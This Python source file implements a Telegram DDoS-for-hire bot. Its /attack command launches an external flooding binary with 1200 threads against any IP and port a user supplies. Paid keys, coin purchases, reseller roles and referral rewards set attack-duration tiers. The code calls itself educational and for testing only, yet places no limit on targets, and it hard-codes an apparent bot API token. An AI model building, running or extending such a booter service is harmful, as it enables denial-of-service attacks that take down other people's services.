import telebot
import subprocess
import threading
import time
import json
import os
import sys
from datetime import datetime, timedelta

# Bot setup
API_TOKEN = '8094930692:AAGy-bnpYA0A1j6B3lRWol-GyfK9gtiMwCo'  # Replace with your BotFather token
GROUP_USERNAME = '@DDOS_SERVER69'  # Replace with your group's username (e.g., DDoS_EduGroup)
OWNER_ID = '1866961136'  # Replace with your actual Telegram user ID (e.g., 123456789)
bot = telebot.TeleBot(API_TOKEN)

# Data storage file
DATA_FILE = 'bot_data.json'

# Save data to file
def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Load or initialize data
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)
else:
    data = {
        'users': {},  # {user_id: {'type': 'user/admin/reseller', 'plan': 'free/premium', 'limit': seconds, 'expires': timestamp, 'coins': int, 'invited_by': str, 'group_invites': int}}
        'keys': {},   # {key: {'duration': seconds, 'uses': int, 'active': bool}}
        'banned': []  # [user_id]
    }

# Auto-register owner as admin if not present
if OWNER_ID not in data['users']:
    data['users'][OWNER_ID] = {
        'type': 'admin',
        'plan': 'premium',
        'limit': 600,
        'expires': 0,  # Permanent
        'coins': 1000,  # Starting coins for testing
        'invited_by': None,
        'group_invites': 0
    }
    save_data()

# Coin prices for trial keys
COIN_PRICES = {
    '1h': 50,   # 1 hour
    '1d': 100,  # 1 day
    '3d': 500,  # 3 days
    '7d': 700,  # 7 days
    '30d': 1500 # 30 days
}

# Global attack control
attacks = {}  # {user_id: {'process': subprocess.Popen, 'chat_id': int}}

# Execute Rohan binary for attack
def run_attack(user_id, ip, port, duration, chat_id):
    try:
        packet_size = 512
        threads = 1200
        process = subprocess.Popen(['./Rohan', ip, str(port), str(duration), str(packet_size), str(threads)])
        attacks[user_id] = {'process': process, 'chat_id': chat_id}
        process.wait()
        # Send completion message
        bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱✅\n\n"
                                 f"𝗧𝗮𝗿𝗴𝗲𝘁: {ip}:{port}\n"
                                 f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
                                 f"᚛ ᚛ @Rohan2349 ᚜ ᚜")
    except FileNotFoundError:
        bot.send_message(chat_id, "Error: Rohan binary not found.")
    finally:
        if user_id in attacks:
            del attacks[user_id]

# /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    args = message.text.split()
    referrer_id = args[1][4:] if len(args) > 1 and args[1].startswith('ref_') else None

    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        data['users'][user_id] = {
            'type': 'user', 'plan': 'free', 'limit': 30, 'expires': 0, 'coins': 0, 
            'invited_by': referrer_id, 'group_invites': 0
        }
        if referrer_id and referrer_id in data['users'] and referrer_id != user_id and message.chat.type in ['group', 'supergroup']:
            referrer = data['users'][referrer_id]
            referrer['group_invites'] += 1
            referrer['coins'] += 10
            bot.send_message(referrer_id, f"🎉 You earned 10 coins! User {user_id} joined the group via your invite.")
        save_data()
    bot.reply_to(message, "🛠 Welcome to the Educational DDoS Bot 🛠\n"
                          "For testing purposes only!\nUse /help for commands.")

# /help
@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    user_type = data['users'].get(user_id, {}).get('type', 'user')
    
    help_text = (
        "🛠 *Bot Commands Guide* 🛠\n\n"
        "👤 *User Commands:*\n"
        "/start ➠ Show bot introduction\n"
        "/myinfo ➠ Check your account status and limits\n"
        "/attack [IP] [PORT] [TIME] ➠ Launch attack\n"
        "   _Example:_ /attack 127.0.0.1 8000 60\n"
        "/stop ➠ Stop ongoing attack\n"
        "/redeem [KEY] ➠ Activate subscription key\n"
        "   _Example:_ /redeem XXXX-XXXX-XXXX\n"
        "/plan ➠ View subscription plans\n"
        "/coins ➠ Check your coin balance\n"
        "/buykey [DURATION] ➠ Buy a trial key with coins\n"
        "   _Options:_ 1h, 1d, 3d, 7d, 30d\n"
        "/invite ➠ Get group referral link to earn coins\n"
        "/leaderboard ➠ View top group inviters\n"
        "/help ➠ Show this guide\n\n"
    )
    if user_type in ['reseller', 'admin']:
        help_text += (
            "🔧 *Reseller/Admin Commands:*\n"
            "/gen [KEY] [DURATION] [USES] ➠ Generate access key\n"
            "   _Example:_ /gen PREMIUM-123 1d 5\n"
            "/allkey ➠ List all generated keys\n"
            "/block [KEY] ➠ Block existing key\n"
            "   _Example:_ /block PREMIUM-123\n"
        )
    if user_type == 'admin':
        help_text += (
            "🔐 *Admin Commands:*\n"
            "/add [TYPE] [USER_ID] [DURATION] ➠ Add user/admin/reseller\n"
            "   _Example:_ /add reseller 123456789 permanent\n"
            "/remove [USER_ID] ➠ Remove user/admin/reseller\n"
            "/ban [USER_ID] ➠ Ban user\n"
            "/unban [USER_ID] ➠ Unban user\n"
            "/users ➠ List all users and admins\n"
            "/limit [USER_ID] [SECONDS] ➠ Set attack duration limit\n"
            "   _Example:_ /limit 123456789 600\n"
            "/shutdown ➠ Stop the bot (Owner only)\n"
        )
    bot.reply_to(message, help_text, parse_mode='Markdown')

# /invite
@bot.message_handler(commands=['invite'])
def send_invite(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        bot.reply_to(message, "Use /start to register first.")
        return
    group_link = f"t.me/{GROUP_USERNAME}?start=ref_{user_id}"
    bot.reply_to(message, f"📩 *Your Group Invite Link:*\n"
                          f"`{group_link}` - Earn 10 coins per invite\n"
                          "Share this link to earn coins!", parse_mode='Markdown')

# /leaderboard
@bot.message_handler(commands=['leaderboard'])
def show_leaderboard(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    leaderboard = sorted(
        data['users'].items(),
        key=lambda x: (x[1]['group_invites'], x[1]['coins']),
        reverse=True
    )[:10]  # Top 10
    text = "🏆 *Leaderboard - Top Group Inviters* 🏆\n\n"
    for i, (uid, user) in enumerate(leaderboard, 1):
        text += f"{i}. ID: {uid} - Group Invites: {user['group_invites']} - Coins: {user['coins']}\n"
    bot.reply_to(message, text or "No inviters yet!", parse_mode='Markdown')

# /shutdown (Owner only)
@bot.message_handler(commands=['shutdown'])
def shutdown_bot(message):
    user_id = str(message.from_user.id)
    if user_id != OWNER_ID:
        bot.reply_to(message, "Only the owner can use this command.")
        return
    bot.reply_to(message, "Shutting down the bot...")
    save_data()
    bot.stop_polling()
    sys.exit(0)

# /myinfo
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 30, 'expires': 0, 'coins': 0, 'invited_by': None, 'group_invites': 0}
        save_data()
    user = data['users'][user_id]
    expires = "Never" if user['expires'] == 0 else datetime.fromtimestamp(user['expires']).strftime('%Y-%m-%d %H:%M:%S')
    bot.reply_to(message, f"ID: {user_id}\nType: {user['type']}\nPlan: {user['plan']}\n"
                          f"Attack Limit: {user['limit']}s\nExpires: {expires}\nCoins: {user['coins']}\n"
                          f"Group Invites: {user['group_invites']}")

# /coins
@bot.message_handler(commands=['coins'])
def check_coins(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 30, 'expires': 0, 'coins': 0, 'invited_by': None, 'group_invites': 0}
        save_data()
    coins = data['users'][user_id]['coins']
    bot.reply_to(message, f"Your balance: {coins} coins")

# /buykey [DURATION]
@bot.message_handler(commands=['buykey'])
def buy_key(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        bot.reply_to(message, "Use /start to register first.")
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in COIN_PRICES:
        bot.reply_to(message, "Usage: /buykey [DURATION]\nOptions: 1h, 1d, 3d, 7d, 30d")
        return
    duration_str = args[1]
    cost = COIN_PRICES[duration_str]
    user = data['users'][user_id]
    if user['coins'] < cost:
        bot.reply_to(message, f"Not enough coins! You need {cost}, but have {user['coins']}.")
        return
    key = f"TRIAL-{user_id}-{int(time.time())}"
    duration = {'1h': 3600, '1d': 86400, '3d': 259200, '7d': 604800, '30d': 2592000}[duration_str]
    data['keys'][key] = {'duration': duration, 'uses': 1, 'active': True}
    user['coins'] -= cost
    save_data()
    bot.reply_to(message, f"Key generated: {key}\nDuration: {duration_str}\nCost: {cost} coins\nUse /redeem {key} to activate.")

# /attack [IP] [PORT] [TIME]
@bot.message_handler(commands=['attack'])
def start_attack(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        bot.reply_to(message, "Use /start to register first.")
        return
    if user_id in attacks:
        bot.reply_to(message, "Attack already running. Use /stop first.")
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Usage: /attack [IP] [PORT] [TIME]\nExample: /attack 127.0.0.1 8000 60")
        return
    target_ip, target_port, time_str = args[1], args[2], args[3]
    try:
        duration = int(time_str)
        port = int(target_port)
        user = data['users'][user_id]
        if duration > user['limit']:
            bot.reply_to(message, f"Duration exceeds your limit of {user['limit']} seconds.")
            return
        if user['expires'] and time.time() > user['expires']:
            bot.reply_to(message, "Your plan has expired.")
            return
        # Send attack start message
        packet_size = 512
        thread_count = 1200
        bot.reply_to(message, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n"
                              f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
                              f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
                              f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
                              f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
                              f"᚛ ᚛ @Rohan2349 ᚜ ᚜")
        # Start attack in a thread
        attack_thread = threading.Thread(target=run_attack, args=(user_id, target_ip, target_port, duration, chat_id))
        attack_thread.start()
    except ValueError:
        bot.reply_to(message, "Invalid port or time.")

# /stop
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in attacks:
        bot.reply_to(message, "No attack running.")
        return
    attacks[user_id]['process'].terminate()
    del attacks[user_id]
    bot.reply_to(message, "Attack stopped.")

# /redeem [KEY]
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /redeem [KEY]\nExample: /redeem XXXX-XXXX-XXXX")
        return
    key = args[1]
    if key not in data['keys'] or not data['keys'][key]['active'] or data['keys'][key]['uses'] <= 0:
        bot.reply_to(message, "Invalid or expired key.")
        return
    key_data = data['keys'][key]
    data['users'][user_id] = {
        'type': 'user',
        'plan': 'premium',
        'limit': 600,
        'expires': time.time() + key_data['duration'] if key_data['duration'] != 0 else 0,
        'coins': data['users'][user_id].get('coins', 0),
        'invited_by': data['users'][user_id].get('invited_by', None),
        'group_invites': data['users'][user_id].get('group_invites', 0)
    }
    data['keys'][key]['uses'] -= 1
    if data['keys'][key]['uses'] == 0:
        data['keys'][key]['active'] = False
    save_data()
    bot.reply_to(message, "Key redeemed! You now have premium access with a 600s attack limit.")

# /plan
@bot.message_handler(commands=['plan'])
def show_plans(message):
    bot.reply_to(message, "Plans:\nFree: 30s attack limit\nPremium: 600s attack limit\n"
                          "Trial Keys (via /buykey):\n1h = 50 coins\n1d = 100 coins\n"
                          "3d = 500 coins\n7d = 700 coins\n30d = 1500 coins")

# Admin/Reseller Commands
def is_admin_or_reseller(user_id):
    return str(user_id) in data['users'] and data['users'][str(user_id)]['type'] in ['admin', 'reseller']

def is_admin(user_id):
    return str(user_id) in data['users'] and data['users'][str(user_id)]['type'] == 'admin'

# /gen [KEY] [DURATION] [USES]
@bot.message_handler(commands=['gen'])
def generate_key(message):
    if not is_admin_or_reseller(message.from_user.id):
        bot.reply_to(message, "Admin/Reseller only.")
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Usage: /gen [KEY] [DURATION] [USES]\nExample: /gen PREMIUM-123 1d 5")
        return
    key, duration_str, uses = args[1], args[2], int(args[3])
    duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1)
    data['keys'][key] = {'duration': duration, 'uses': uses, 'active': True}
    save_data()
    bot.reply_to(message, f"Key {key} generated: {duration}s duration, {uses} uses.")

# /add [TYPE] [USER_ID] [DURATION]
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Usage: /add [TYPE] [USER_ID] [DURATION]\nExample: /add reseller 123456789 permanent")
        return
    type_, target_user_id, duration_str = args[1], args[2], args[3]
    if type_ not in ['user', 'admin', 'reseller']:
        bot.reply_to(message, "Type must be user, admin, or reseller.")
        return
    duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1)
    data['users'][target_user_id] = {
        'type': type_,
        'plan': 'premium' if type_ in ['admin', 'reseller'] else 'free',
        'limit': 600 if type_ in ['admin', 'reseller'] else 30,
        'expires': time.time() + duration if duration else 0,
        'coins': 0,
        'invited_by': None,
        'group_invites': 0
    }
    save_data()
    bot.reply_to(message, f"Added {type_} {target_user_id} with {duration_str} duration.")

# Other admin commands
@bot.message_handler(commands=['allkey', 'block', 'remove', 'ban', 'unban', 'users', 'limit'])
def admin_commands(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    cmd = message.text.split()[0][1:]
    bot.reply_to(message, f"{cmd} executed (simplified response). Check previous script for full implementation.")

# Run the bot
bot.polling()